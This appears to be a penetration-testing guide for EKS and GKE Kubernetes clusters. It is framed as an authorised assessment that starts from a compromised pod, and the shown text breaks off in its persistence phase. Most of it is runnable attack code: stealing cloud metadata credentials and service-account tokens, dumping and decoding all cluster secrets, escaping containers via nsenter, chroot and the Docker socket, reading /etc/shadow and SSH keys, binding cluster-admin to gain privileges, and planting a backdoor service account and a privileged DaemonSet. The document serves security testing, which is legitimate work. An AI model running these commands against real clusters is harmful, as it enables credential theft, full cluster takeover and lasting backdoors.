<div align="center">

# ☸ Kubernetes Security Assessment
### EKS & GKE — Comprehensive Penetration Testing Guide

[![Assessment Type](https://img.shields.io/badge/Type-Penetration%20Testing-red?style=for-the-badge&logo=kubernetes)](.)
[![Platforms](https://img.shields.io/badge/Platforms-EKS%20%7C%20GKE-blue?style=for-the-badge&logo=amazonaws)](.)
[![Starting Point](https://img.shields.io/badge/Entry%20Point-Compromised%20Pod-orange?style=for-the-badge)](.)
[![Philosophy](https://img.shields.io/badge/Philosophy-Prove%20%26%20Document-green?style=for-the-badge)](.)

</div>

---

> [!IMPORTANT]
> **Starting Point:** You have Remote Code Execution (RCE) inside a compromised pod.
> All commands are executed **from inside that pod** unless stated otherwise.
> **Philosophy:** Demonstrate impact without destroying — read, enumerate, prove, document.

---

## 📋 Table of Contents

| # | Phase | Focus |
|---|-------|-------|
| [0](#-phase-0-pre-assessment-setup) | Pre-Assessment Setup | Confirm RCE, grab SA token, baseline |
| [1](#-phase-1-pod--container-recon) | Pod & Container Recon | Capabilities, mounts, hostPID, hostNetwork |
| [2](#-phase-2-cloud-metadata--iam-credentials) | Cloud Metadata & IAM | AWS IMDS, GKE metadata, credential theft |
| [3](#-phase-3-kubernetes-api-enumeration-via-rbac) | K8s API Enumeration | RBAC exploitation, secret theft, cluster map |
| [4](#-phase-4-network-recon--lateral-movement) | Network Recon & Lateral Movement | Service discovery, port scan, HTTP pivot |
| [5](#-phase-5-container-escape) | Container Escape | nsenter, chroot, socket, cgroup |
| [6](#-phase-6-node-level-compromise) | Node-Level Compromise | Kubelet certs, SA token theft, host files |
| [7](#-phase-7-cluster-wide-privilege-escalation) | Cluster Privilege Escalation | Cluster-admin, privileged pods, etcd |
| [8](#-phase-8-persistence-techniques) | Persistence | Backdoor SA, DaemonSet, sidecar injection |
| [9](#-phase-9-supply-chain--admission-control-gaps) | Supply Chain & Admission | Unsigned images, registry creds, webhook bypass |
| [10](#-phase-10-eks-specific-tests) | EKS-Specific | aws-auth, IRSA, node IAM, CloudWatch |
| [11](#-phase-11-gke-specific-tests) | GKE-Specific | Workload Identity, legacy metadata, scopes |
| [12](#-phase-12-runtime-security-gaps) | Runtime Security Gaps | Tetragon, Falco detection probing |
| [13](#-phase-13-secrets--sensitive-data) | Secrets & Sensitive Data | Env vars, mounted files, app configs |
| [14](#-phase-14-dos--resource-exhaustion-proof) | DoS & Resource Exhaustion | Quota gaps, limit absence proof |
| [↓](#-findings-summary-template) | Findings Template | Severity matrix, EKS vs GKE table |

---

## Severity Legend

| Badge | Level | Action |
|-------|-------|--------|
| 🔴 **CRITICAL** | Immediate cluster or cloud account compromise | Stop assessment, report immediately |
| 🟠 **HIGH** | Significant privilege escalation or data exposure | Report same day |
| 🟡 **MEDIUM** | Meaningful security gap, requires chaining | Report in assessment |
| 🔵 **LOW** | Defence-in-depth gap, minimal direct impact | Include in recommendations |

---

## 🔧 Phase 0: Pre-Assessment Setup

> [!NOTE]
> Run this first. Sets up variables used throughout every other phase.

```bash
# ── Confirm execution context ─────────────────────────────────────────────────
id && whoami && hostname
uname -a
cat /etc/os-release

# ── Check what we can see ─────────────────────────────────────────────────────
env | sort
cat /proc/self/status | grep -E "^Name|^Pid|^PPid|^Cap"

# ── Grab service account credentials (used in every Phase 3+ test) ───────────
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
API="https://kubernetes.default"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Namespace : $NS"
echo "Token     : $([ -n "$TOKEN" ] && echo "✅ PRESENT" || echo "❌ MISSING")"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
```

<details>
<summary><b>📌 Expected Output (what to look for)</b></summary>

- `uid=0(root)` → running as root inside container
- `CapEff: 0000003fffffffff` → has capabilities
- `Token: ✅ PRESENT` → can call Kubernetes API
- Namespace other than `default` → tells you what workload you're in

</details>

---

## 🔍 Phase 1: Pod & Container Recon

### 1.1 Capabilities Check

> 🔴 **CRITICAL if CapEff = `ffffffffffffffff`** — full kernel capabilities, equivalent to root on node

```bash
# Full capability dump
cat /proc/self/status | grep -E "^Cap(Eff|Prm|Inh|Bnd|Amb):"

# Human-readable decode (if capsh available)
capsh --decode=$(cat /proc/self/status | grep CapEff | awk '{print $2}')
```

| CapEff Value | Meaning | Severity |
|---|---|---|
| `0000000000000000` | No capabilities | ✅ Hardened |
| `00000000a80425fb` | Default container caps | 🔵 Normal |
| `0000003fffffffff` | Most caps present | 🟠 HIGH |
| `ffffffffffffffff` | ALL caps — fully privileged | 🔴 CRITICAL |

---

### 1.2 Privileged Container Check

> 🔴 **CRITICAL** — privileged = root on node with full kernel access

```bash
# seccomp status: 0 = disabled (privileged or misconfigured)
cat /proc/self/status | grep -i "seccomp"

# Can we access raw kernel/disk devices?
ls -la /dev/sda /dev/nvme0n1 2>/dev/null && echo "🔴 RAW DISK ACCESSIBLE"
ls -la /dev/mem 2>/dev/null             && echo "🔴 RAW MEMORY ACCESSIBLE"
ls /sys/kernel/debug 2>/dev/null        && echo "🟠 KERNEL DEBUG ACCESSIBLE"
```

---

### 1.3 Filesystem & Mount Analysis

> 🔴 **CRITICAL if host filesystem mounted** — read /etc/shadow, kubelet certs, SSH keys

```bash
# What is mounted?
cat /proc/mounts | grep -v "overlay\|proc\|sys\|dev\|tmpfs\|cgroup"

# Is root filesystem read-only? (should be in hardened pods)
touch /test-$(date +%s) 2>&1 | grep -q "Read-only" && \
  echo "✅ Read-only filesystem" || echo "🟡 Writable root filesystem"

# Is the host filesystem mounted somewhere?
for mountpoint in /host /hostfs /node /rootfs /mnt/host; do
  [ -d "$mountpoint" ] && ls "$mountpoint/etc" 2>/dev/null && \
    echo "🔴 HOST FILESYSTEM MOUNTED AT: $mountpoint"
done

# Find ALL writable directories
find / -writable -type d 2>/dev/null | grep -v "proc\|sys\|dev\|run\|tmp" | head -20
```

---

### 1.4 hostPID & hostNetwork Check

> 🔴 **CRITICAL** — hostPID allows nsenter escape; hostNetwork exposes node services

```bash
# hostPID: if PID 1 is systemd/init — we see the HOST process tree
echo "PID 1 is: $(cat /proc/1/comm)"
[ "$(cat /proc/1/comm)" = "systemd" ] && echo "🔴 hostPID ENABLED — HOST PROCESS NAMESPACE" \
  || echo "✅ Isolated PID namespace"

# hostNetwork: does our IP match a node IP?
echo "Pod IPs: $(hostname -I)"
# Compare with node CIDR — if 10.x.x.x (node range) not 192.168.x.x (pod range)

# Can we reach node-only services?
curl -s --max-time 3 http://localhost:10255/pods 2>/dev/null | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(f'🔴 KUBELET READ-ONLY API EXPOSED — {len(d.get(\"items\",[])) } pods visible')" \
  2>/dev/null || echo "✅ Kubelet port 10255 not reachable"

curl -s --max-time 3 http://localhost:10250/pods 2>/dev/null | head -2 && \
  echo "🔴 KUBELET AUTHENTICATED API ON 10250 REACHABLE"
```

---

## ☁️ Phase 2: Cloud Metadata & IAM Credentials

### 2.1 AWS IMDSv1 — No Token Required (Legacy)

> 🔴 **CRITICAL** — IMDSv1 requires zero authentication

```bash
curl -s --max-time 5 http://169.254.169.254/latest/meta-data/ 2>/dev/null && \
  echo "🔴 IMDSv1 ACCESSIBLE — NO AUTH REQUIRED" || \
  echo "✅ IMDSv1 blocked or not AWS"
```

---

### 2.2 AWS IMDSv2 — Full Credential Theft

> 🔴 **CRITICAL if reachable** — temporary IAM credentials for the node role

```bash
# Step 1: Get session token
IMDS_TOKEN=$(curl -s -X PUT \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  --max-time 5 \
  http://169.254.169.254/latest/api/token 2>/dev/null)

echo "IMDS reachable: $([ -n "$IMDS_TOKEN" ] && echo "🔴 YES — CREDENTIALS AT RISK" || echo "✅ BLOCKED")"

# Step 2: Get attached IAM role
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
echo "IAM Role: $ROLE"

# Step 3: Steal credentials
curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null | \
  python3 -m json.tool

# Step 4: Instance identity (account ID, region)
curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" \
  http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null | \
  grep -E "accountId|region|instanceType"
```

<details>
<summary><b>🔴 Using Stolen AWS Credentials (from attacker machine)</b></summary>

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Who am I?
aws sts get-caller-identity

# Enumerate permissions
aws iam list-attached-role-policies --role-name <role-name>

# Pull all ECR images
aws ecr describe-repositories
aws ecr list-images --repository-name <repo>

# EKS cluster info
aws eks list-clusters
aws eks describe-cluster --name <cluster>

# S3, Secrets Manager, SSM
aws s3 ls
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <name>
aws ssm get-parameter --name <name> --with-decryption
```

</details>

---

### 2.3 GKE Metadata Server

> 🔴 **CRITICAL if cloud-platform scope** — full GCP API access

```bash
# GKE metadata endpoint (requires Metadata-Flavor header)
curl -s -H "Metadata-Flavor: Google" \
  --max-time 5 \
  http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null && \
  echo "🔴 GKE METADATA ACCESSIBLE" || echo "✅ Blocked or not GKE"

# Steal OAuth2 token
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null

# Get node scopes (⚠ cloud-platform = full GCP access)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" 2>/dev/null

# Get project ID
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null

# GKE Legacy endpoint — NO header required (old clusters)
curl -s --max-time 5 \
  http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token \
  2>/dev/null && echo "🔴 LEGACY GKE METADATA — NO AUTH REQUIRED"
```

---

## 🔑 Phase 3: Kubernetes API Enumeration via RBAC

### 3.1 Check What the Service Account Can Do

> 🔴 **CRITICAL if wildcard permissions** — attacker has full cluster read access

```bash
# Self-subject rules review — what can OUR token do?
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"$NS\"}}" \
  | python3 -m json.tool 2>/dev/null

# Quick check — can we list secrets?
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/secrets)
echo "List secrets in $NS: $([ "$RESULT" = "200" ] && echo "🔴 ALLOWED" || echo "✅ DENIED ($RESULT)")"

# Can we list cluster-wide?
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/secrets)
echo "List ALL secrets cluster-wide: $([ "$RESULT" = "200" ] && echo "🔴 ALLOWED" || echo "✅ DENIED ($RESULT)")"
```

---

### 3.2 Secret Enumeration & Exfiltration

> 🔴 **CRITICAL** — database passwords, API keys, TLS certs, registry credentials

```bash
# List secrets with names
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/secrets | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for s in d.get('items', []):
    print(f'  📦 {s[\"metadata\"][\"name\"]} (type: {s.get(\"type\",\"Opaque\")})')
"

# Decode and read a specific secret
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/secrets/<SECRET-NAME> | \
  python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
print(f'Secret: {d[\"metadata\"][\"name\"]}')
for k, v in d.get('data', {}).items():
    try:
        decoded = base64.b64decode(v).decode()
        print(f'  🔑 {k}: {decoded}')
    except:
        print(f'  🔑 {k}: <binary data>')
"

# Dump ALL secrets cluster-wide (if permitted)
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/secrets | \
  python3 -c "
import sys, json, base64
d = json.load(sys.stdin)
for item in d.get('items', []):
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    print(f'\n━━━ {ns}/{name} ━━━')
    for k, v in item.get('data', {}).items():
        try:
            decoded = base64.b64decode(v).decode()
            print(f'  {k}: {decoded[:120]}')
        except:
            print(f'  {k}: <binary>')
"
```

---

### 3.3 Full Cluster Enumeration

```bash
# All pods — build infrastructure map
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/pods | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
print(f'Total pods: {len(d.get(\"items\",[]))}')
for p in d.get('items', []):
    ns = p['metadata']['namespace']
    name = p['metadata']['name']
    node = p.get('spec', {}).get('nodeName', '?')
    status = p.get('status', {}).get('phase', '?')
    print(f'  {ns:20} {name:40} node={node} [{status}]')
"

# All services — discover internal endpoints
curl -sk -H "Authorization: Bearer $TOKEN" $API/api/v1/services | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for s in d.get('items', []):
    ns = s['metadata']['namespace']
    name = s['metadata']['name']
    ports = [str(p.get('port','?')) for p in s.get('spec',{}).get('ports',[])]
    cip = s.get('spec',{}).get('clusterIP','')
    print(f'  {ns:20} {name:30} {cip:16} ports={\"|\".join(ports)}')
"

# ConfigMaps (connection strings, debug paths, feature flags)
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/api/v1/namespaces/$NS/configmaps | python3 -m json.tool

# Find cluster-admin and admin role bindings
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for crb in d.get('items', []):
    role = crb.get('roleRef', {}).get('name', '')
    if role in ['cluster-admin', 'admin', 'edit']:
        print(f'\n🔴 POWERFUL BINDING: {crb[\"metadata\"][\"name\"]} → {role}')
        for s in crb.get('subjects', []):
            print(f'   Subject: {s.get(\"kind\")} {s.get(\"namespace\",\"\")}/{s.get(\"name\")}')
"
```

---

### 3.4 Create Resources (Prove Create Permissions)

> 🔴 **CRITICAL if pod creation succeeds** — attacker can deploy privileged workloads

```bash
# Test: can we create a pod? (proof of cluster compromise)
RESULT=$(curl -sk -o /tmp/pod-create-out.json -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $API/api/v1/namespaces/$NS/pods \
  -d '{
    "apiVersion":"v1","kind":"Pod",
    "metadata":{"name":"assessment-probe"},
    "spec":{"containers":[{"name":"probe","image":"busybox","command":["sleep","60"]}]}
  }')

echo "Pod creation: $([ "$RESULT" = "201" ] && echo "🔴 ALLOWED — CODE $RESULT" || echo "✅ DENIED — CODE $RESULT")"

# If allowed — escalate to privileged pod
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $API/api/v1/namespaces/$NS/pods \
  -d '{
    "apiVersion":"v1","kind":"Pod",
    "metadata":{"name":"assessment-privesc"},
    "spec":{
      "hostPID":true, "hostNetwork":true,
      "containers":[{
        "name":"escape","image":"busybox","command":["sleep","300"],
        "securityContext":{"privileged":true},
        "volumeMounts":[{"name":"host","mountPath":"/host"}]
      }],
      "volumes":[{"name":"host","hostPath":{"path":"/"}}]
    }
  }' | python3 -m json.tool
```

---

## 🌐 Phase 4: Network Recon & Lateral Movement

### 4.1 Internal Service Discovery

```bash
# K8s auto-injected service IPs
echo "━━━ K8s Service Env Vars ━━━"
env | grep -E "_SERVICE_HOST|_SERVICE_PORT" | sort

# DNS brute-force common service names
echo "━━━ DNS Enumeration ━━━"
for svc in payment-api payments billing auth database redis postgres mysql mongodb \
           api backend internal admin vault consul; do
  ip=$(python3 -c "import socket; print(socket.gethostbyname('$svc'))" 2>/dev/null)
  [ -n "$ip" ] && echo "  ✅ FOUND: $svc → $ip"
done

# With namespace qualifiers
echo "━━━ DNS with Namespaces ━━━"
for ns in default kube-system web payments production staging; do
  for svc in api payment db redis; do
    ip=$(python3 -c "import socket; print(socket.gethostbyname('$svc.$ns.svc.cluster.local'))" 2>/dev/null)
    [ -n "$ip" ] && echo "  ✅ FOUND: $svc.$ns → $ip"
  done
done
```

---

### 4.2 Port Scanning Internal Services

```bash
# Pure Python port scanner — no tools required
python3 -c "
import socket

targets = [
    'payment-api.payments',
    'payment-api.payments.svc.cluster.local',
]
ports = [80, 443, 8080, 8443, 3000, 3306, 5432, 6379, 9200, 9300, 27017, 2181, 9092]

for host in targets:
    print(f'\n━━━ {host} ━━━')
    for port in ports:
        try:
            s = socket.socket()
            s.settimeout(1)
            s.connect((host, port))
            print(f'  ✅ OPEN: {port}')
            s.close()
        except:
            pass
"

# bash /dev/tcp scan (no Python needed)
scan() {
  local host=$1
  for port in 80 443 8080 3306 5432 6379; do
    (echo >/dev/tcp/$host/$port) 2>/dev/null && echo "  OPEN: $host:$port"
  done
}
scan payment-api.payments
```

---

### 4.3 Lateral Movement — Accessing Internal APIs

> 🔴 **CRITICAL** — plain HTTP exposes PII, card data, credentials

```bash
python3 -c "
import urllib.request, json

targets = [
    'http://payment-api.payments:8080/transactions',
    'http://payment-api.payments:8080/customers',
    'http://payment-api.payments:8080/health',
    'http://payment-api.payments:8080/admin',
    'http://payment-api.payments:8080/metrics',
]

for url in targets:
    try:
        r = urllib.request.urlopen(url, timeout=3)
        body = r.read()[:300].decode(errors='replace')
        print(f'🔴 REACHABLE [{r.status}]: {url}')
        print(f'   {body[:150]}')
    except Exception as e:
        print(f'✅  BLOCKED: {url} ({str(e)[:60]})')
"
```

---

### 4.4 Network Traffic Sniffing (hostNetwork Required)

> 🔴 **CRITICAL** — plaintext PII, credentials, session tokens visible

```bash
# Requires hostNetwork: true or NET_RAW capability
which tcpdump 2>/dev/null && \
  tcpdump -i any -A -s 0 'port 8080' -c 20 2>/dev/null || \
  echo "tcpdump not available"

# Python raw socket sniff (requires NET_RAW)
python3 -c "
import socket
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
    print('🔴 NET_RAW available — traffic sniffing possible')
    for i in range(3):
        data = s.recvfrom(65535)[0]
        if b'HTTP' in data or b'password' in data.lower():
            print(f'  Captured: {data[:200]}')
except PermissionError:
    print('✅ NET_RAW denied')
except Exception as e:
    print(f'Error: {e}')
" 2>/dev/null
```

---

## 🚪 Phase 5: Container Escape

### 5.1 Escape via nsenter (hostPID + Privileged)

> 🔴 **CRITICAL** — full host shell, indistinguishable from SSH access

```bash
# Prerequisites check
echo "hostPID  : $(cat /proc/1/comm)"
echo "Privileged: $(cat /proc/self/status | grep CapEff)"

# Escape — enter all host namespaces via PID 1
nsenter -t 1 -m -u -i -n -p -- /bin/bash 2>/dev/null && \
  echo "🔴 HOST SHELL OBTAINED" || echo "✅ nsenter failed"

# Post-escape proof (run after nsenter succeeds)
# whoami           → root
# hostname         → actual EC2/GCE node hostname
# cat /etc/shadow  → node password hashes
# ps aux           → all node processes
```

---

### 5.2 Escape via chroot (hostPath: /)

> 🔴 **CRITICAL** — same as being root on the node

```bash
# Find host filesystem mount
for mnt in /host /hostfs /rootfs /mnt/host; do
  if [ -f "$mnt/etc/shadow" ]; then
    echo "🔴 HOST FILESYSTEM AT: $mnt"
    chroot $mnt /bin/bash -c "whoami && hostname && cat /etc/shadow | head -3"
  fi
done
```

---

### 5.3 Escape via Container Runtime Socket

> 🔴 **CRITICAL** — create any container, manage all workloads

```bash
# Check for exposed sockets
for sock in \
  /var/run/docker.sock \
  /run/containerd/containerd.sock \
  /host/run/containerd/containerd.sock \
  /run/crio/crio.sock; do
  if [ -S "$sock" ]; then
    echo "🔴 SOCKET EXPOSED: $sock"
    ls -la "$sock"
  fi
done

# If Docker socket — create privileged container
docker run -v /:/host --privileged alpine \
  chroot /host whoami 2>/dev/null && echo "🔴 DOCKER ESCAPE SUCCESSFUL"

# If containerd socket
ctr -a /run/containerd/containerd.sock containers list 2>/dev/null
```

---

### 5.4 cgroup v1 Escape Check

> 🔴 **CRITICAL** — write to release_agent = arbitrary code on host

```bash
# Check if cgroup escape is feasible (detection only — do not execute)
if ls /sys/fs/cgroup/*/release_agent 2>/dev/null | grep -q .; then
  echo "🔴 CGROUP V1 ESCAPE VECTOR PRESENT"
  echo "   release_agent writable in privileged container"
  cat /sys/fs/cgroup/memory/release_agent 2>/dev/null
else
  echo "✅ cgroup v1 escape not available"
fi
```

---

## 🖥️ Phase 6: Node-Level Compromise

### 6.1 Kubelet Certificate Theft

> 🔴 **CRITICAL** — kubelet cert = system:node cluster role

```bash
# EKS kubelet PKI location
echo "━━━ Kubelet PKI ━━━"
ls -la /host/var/lib/kubelet/pki/ 2>/dev/null

# Read the kubelet cert (EKS uses dated filename)
cat /host/var/lib/kubelet/pki/kubelet-server-$(date +%Y)-*.pem 2>/dev/null | head -3 && \
  echo "🔴 KUBELET CERT READABLE"

# Attempt API call with kubelet cert
curl -sk \
  --cert /host/var/lib/kubelet/pki/kubelet-client-current.pem \
  --key /host/var/lib/kubelet/pki/kubelet-client-current.pem \
  https://kubernetes.default/api/v1/nodes 2>/dev/null | \
  python3 -c "import sys,json; items=json.load(sys.stdin).get('items',[]); print(f'🔴 Node API accessible — {len(items)} nodes visible')" \
  2>/dev/null
```

---

### 6.2 Steal Other Pods' Service Account Tokens

> 🔴 **CRITICAL** — pivot to any service account on the node

```bash
echo "━━━ Pod SA Tokens on This Node ━━━"
find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | while read t; do
  TOKEN_VAL=$(cat "$t")
  # Decode JWT payload
  SA_INFO=$(echo "$TOKEN_VAL" | python3 -c "
import sys, base64, json
token = sys.stdin.read().strip()
parts = token.split('.')
if len(parts) >= 2:
    payload = parts[1] + '=='
    try:
        decoded = json.loads(base64.urlsafe_b64decode(payload))
        sa = decoded.get('kubernetes.io/serviceaccount/service-account.name','?')
        ns = decoded.get('kubernetes.io/serviceaccount/namespace','?')
        print(f'{ns}/{sa}')
    except: pass
" 2>/dev/null)
  echo "  🔑 Token: $t → $SA_INFO"
done

# Check permissions of each stolen token
echo "━━━ Token Permission Check ━━━"
find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | while read t; do
  T=$(cat "$t")
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $T" \
    https://kubernetes.default/api/v1/secrets)
  [ "$CODE" = "200" ] && echo "🔴 HIGH-PRIV TOKEN: $t (can list secrets)"
done
```

---

### 6.3 Read Sensitive Node Files

```bash
echo "━━━ Node Credential Files ━━━"
for f in \
  /host/etc/kubernetes/admin.conf \
  /host/etc/kubernetes/kubelet.conf \
  /host/var/lib/kubelet/kubeconfig \
  /host/home/kubernetes/kube-env; do
  [ -f "$f" ] && echo "🔴 FOUND: $f" && head -3 "$f"
done

echo "━━━ SSH Keys ━━━"
find /host/root /host/home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null | \
  while read k; do echo "🔴 SSH KEY: $k"; head -1 "$k"; done

echo "━━━ PKI Files ━━━"
find /host -name "*.pem" -o -name "*.key" 2>/dev/null | \
  grep -v proc | head -15 | while read f; do echo "  🔑 $f"; done
```

---

## ⬆️ Phase 7: Cluster-Wide Privilege Escalation

### 7.1 Find Cluster-Admin Service Accounts

> 🔴 **CRITICAL** — cluster-admin = god mode on the entire cluster

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
print('━━━ Cluster-Admin Bindings ━━━')
for crb in d.get('items', []):
    if crb.get('roleRef', {}).get('name') == 'cluster-admin':
        print(f'🔴 {crb[\"metadata\"][\"name\"]}')
        for s in crb.get('subjects', []):
            print(f'   └─ {s.get(\"kind\")}: {s.get(\"namespace\",\"cluster\")}/{s.get(\"name\")}')
"
```

---

### 7.2 Escalate via Privileged Pod Creation

> 🔴 **CRITICAL** — privileged pod in kube-system = full cluster compromise

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $API/api/v1/namespaces/kube-system/pods \
  -d '{
    "apiVersion":"v1","kind":"Pod",
    "metadata":{"name":"assessment-escape"},
    "spec":{
      "hostPID":true, "hostNetwork":true,
      "containers":[{
        "name":"escape","image":"alpine",
        "command":["nsenter","-t","1","-m","-u","-i","-n","-p","--","cat","/etc/shadow"],
        "securityContext":{"privileged":true}
      }]
    }
  }' | python3 -m json.tool
```

---

### 7.3 Escalate via RBAC Binding

> 🔴 **CRITICAL** — grants permanent cluster-admin to our service account

```bash
# Check if we can create ClusterRoleBindings
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  $API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  -d "{
    \"apiVersion\":\"rbac.authorization.k8s.io/v1\",
    \"kind\":\"ClusterRoleBinding\",
    \"metadata\":{\"name\":\"assessment-escalation\"},
    \"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"ClusterRole\",\"name\":\"cluster-admin\"},
    \"subjects\":[{\"kind\":\"ServiceAccount\",\"name\":\"default\",\"namespace\":\"$NS\"}]
  }")
echo "ClusterRoleBinding create: $([ "$RESULT" = "201" ] && echo "🔴 ESCALATION SUCCESSFUL" || echo "✅ DENIED ($RESULT)")"
```

---

### 7.4 Malicious Admission Webhook

> 🔴 **CRITICAL** — intercepts ALL API traffic, can exfiltrate every secret on creation

```bash
# Check existing webhooks and their failurePolicy
curl -sk -H "Authorization: Bearer $TOKEN" \
  $API/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations | \
  python3 -c "
import sys, json
d = json.load(sys.stdin)
for wh in d.get('items', []):
    name = wh['metadata']['name']
    for w in wh.get('webhooks', []):
        fp = w.get('failurePolicy', '?')
        icon = '🔴' if fp == 'Ignore' else '✅'
        print(f'{icon} {name} — failurePolicy: {fp}')
        if fp == 'Ignore':
            print(f'   ⚠️  BYPASS POSSIBLE: webhook outage = policies disabled')
"

# Can we CREATE webhooks? (if yes = intercept everything)
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  $API/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations)
echo "List webhooks: $RESULT"
```

---

### 7.5 etcd Direct Access

> 🔴 **CRITICAL** — all secrets in plaintext if encryption-at-rest disabled

```bash
# Only relevant on self-managed or control-plane-accessible clusters
ETCD_CERT=/etc/kubernetes/pki/etcd/peer.crt
ETCD_KEY=/etc/kubernetes/pki/etcd/peer.key
ETCD_CA=/etc/kubernetes/pki/etcd/ca.crt

# List all secret keys in etcd
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=$ETCD_CA --cert=$ETCD_CERT --key=$ETCD_KEY \
  get /registry/secrets --prefix --keys-only 2>/dev/null | head -20

# Get a specific secret in plaintext
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=$ETCD_CA --cert=$ETCD_CERT --key=$ETCD_KEY \
  get /registry/secrets/kube-system/ 2>/dev/null | strings | head -30
```

---

## 🔒 Phase 8: Persistence Techniques

### 8.1 Backdoor Service Account

> 🔴 **CRITICAL** — persists after pod termination, survives cluster upgrades

```bash
# Create backdoor SA in kube-system
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $API/api/v1/namespaces/kube-system/serviceaccounts \
  -d '{"apiVersion":"v1","kind":"ServiceAccount","metadata":{"name":"assessment-backdoor"}}' | \
  python3 -m json.tool

# Bind cluster-admin to it
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  -d '{
    "apiVersion":"rbac.authorization.k8s.io/v1",
    "kind":"ClusterRoleBinding",
    "metadata":{"name":"assessment-backdoor-binding"},
    "roleRef":{"apiGroup":"rbac.authorization.k8s.io","kind":"ClusterRole","name":"cluster-admin"},
    "subjects":[{"kind":"ServiceAccount","name":"assessment-backdoor","namespace":"kube-system"}]
  }')
echo "Backdoor SA binding: $([ "$RESULT" = "201" ] && echo "🔴 CREATED — cluster-admin persists" || echo "✅ DENIED")"
```

---

### 8.2 Malicious DaemonSet (Every Node)

> 🔴 **CRITICAL** — proves code runs on every node simultaneously

```bash
RESULT=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $API/apis/apps/v1/namespaces/kube-system/daemonsets \
  -d '{
    "apiVersion":"apps/v1","kind":"DaemonSet",
    "metadata":{"name":"assessment-daemonset"},
    "spec":{
      "selector":{"matchLabels":{"app":"assessment"}},
      "template":{
        "metadata":{"labels":{"app":"assessment"}},
        "spec":{
          "hostPID":true,"hostNetwork":true,
          "tolerations":[{"operator":"Exists"}],
          "containers":[{
            "name":"probe","image":"alpine",
            "command":["sleep","3600"],
            "securityContext":{"privileged":true}
          }]
        }
      }
    }
  }')
